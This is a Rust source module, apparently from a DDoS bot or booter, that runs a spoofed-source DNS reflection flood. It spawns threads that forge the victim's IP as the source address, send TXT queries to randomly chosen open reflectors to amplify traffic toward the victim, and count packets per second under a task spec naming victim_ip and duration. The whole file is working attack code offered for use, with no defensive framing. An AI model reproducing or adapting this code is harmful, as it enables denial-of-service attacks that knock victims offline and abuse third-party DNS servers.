// 反射攻击循环：伪源 DNS 查询洪泛。
// 每任务 N 线程；统计原子计数；节流由 throttle 模块提供。

use crate::dns;
use crate::reflector::Reflector;
use crate::spoof::SpoofSocket;
use crate::throttle::Throttle;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::{Duration, Instant};

// MIPS32 等 32 位平台没有 64 位原子原语：按平台选择原子类型
#[cfg(target_has_atomic = "64")]
use std::sync::atomic::AtomicU64 as AtomicCount;
#[cfg(not(target_has_atomic = "64"))]
use std::sync::atomic::AtomicU32 as AtomicCount;

#[derive(Default)]
pub struct Stats {
    packets: AtomicCount,
    bytes: AtomicCount,
    errors: AtomicCount,
    pps: AtomicCount,
}

impl Stats {
    #[cfg(target_has_atomic = "64")]
    pub fn add(&self, packets: u64, bytes: u64, errors: u64) {
        self.packets.fetch_add(packets, Ordering::Relaxed);
        self.bytes.fetch_add(bytes, Ordering::Relaxed);
        self.errors.fetch_add(errors, Ordering::Relaxed);
    }
    #[cfg(not(target_has_atomic = "64"))]
    pub fn add(&self, packets: u64, bytes: u64, errors: u64) {
        self.packets.fetch_add(packets as u32, Ordering::Relaxed);
        self.bytes.fetch_add(bytes as u32, Ordering::Relaxed);
        self.errors.fetch_add(errors as u32, Ordering::Relaxed);
    }
    #[cfg(target_has_atomic = "64")]
    pub fn set_pps(&self, pps: u64) {
        self.pps.store(pps, Ordering::Relaxed);
    }
    #[cfg(not(target_has_atomic = "64"))]
    pub fn set_pps(&self, pps: u64) {
        self.pps.store(pps as u32, Ordering::Relaxed);
    }
    pub fn packets(&self) -> u64 {
        self.packets.load(Ordering::Relaxed) as u64
    }
    pub fn bytes(&self) -> u64 {
        self.bytes.load(Ordering::Relaxed) as u64
    }
    pub fn errors(&self) -> u64 {
        self.errors.load(Ordering::Relaxed) as u64
    }
    pub fn pps(&self) -> u64 {
        self.pps.load(Ordering::Relaxed) as u64
    }
}

pub struct TaskSpec {
    pub task_id: String,
    pub victim_ip: [u8; 4],
    pub duration_secs: u64,
    pub threads: u32,
    pub reflectors: Vec<Reflector>,
    pub max_pps: u64,
}

/// 运行一次 DNS 反射攻击（阻塞直到结束）。
/// 统计经 Arc 共享（线程写入）。
pub fn run_dns_reflection(spec: &TaskSpec, stats: Arc<Stats>) {
    let dur = Duration::from_secs(spec.duration_secs);
    let mut handles = Vec::new();

    for t in 0..spec.threads {
        let victim = spec.victim_ip;
        let reflectors = spec.reflectors.clone();
        let stats = Arc::clone(&stats);
        let mut thr = Throttle::new(spec.max_pps / u64::from(spec.threads.max(1)));
        let dur = dur;
        handles.push(std::thread::spawn(move || {
            let mut rng_state = (t as u64).wrapping_mul(0x9E3779B97F4A7C15) + 1;
            let sock = match SpoofSocket::new() {
                Ok(s) => s,
                Err(_) => return,
            };
            let end = Instant::now() + dur;
            let mut local_pkt = 0u64;
            let mut last_tick = Instant::now();
            let mut last_pkt = 0u64;

            while Instant::now() < end {
                if !thr.allow() {
                    std::thread::sleep(Duration::from_micros(100));
                    continue;
                }
                // 随机选反射器 + 随机 DNS id
                rng_state ^= rng_state << 13;
                rng_state ^= rng_state >> 7;
                rng_state ^= rng_state << 17;
                let idx = (rng_state % reflectors.len() as u64) as usize;
                let refr = &reflectors[idx];
                let domain = if refr.domain.is_empty() { "isc.org" } else { &refr.domain };
                let q = dns::build_txt_query(domain, (rng_state & 0xFFFF) as u16);

                match sock.send_udp(victim, refr.ip, refr.port, &q) {
                    Ok(_) => {
                        stats.add(1, q.len() as u64, 0);
                        local_pkt += 1;
                    }
                    Err(_) => {
                        stats.add(0, 0, 1);
                    }
                }

                // 每秒统计 PPS
                if last_tick.elapsed() >= Duration::from_secs(1) {
                    let delta = local_pkt - last_pkt;
                    stats.set_pps(delta);
                    last_pkt = local_pkt;
                    last_tick = Instant::now();
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
}
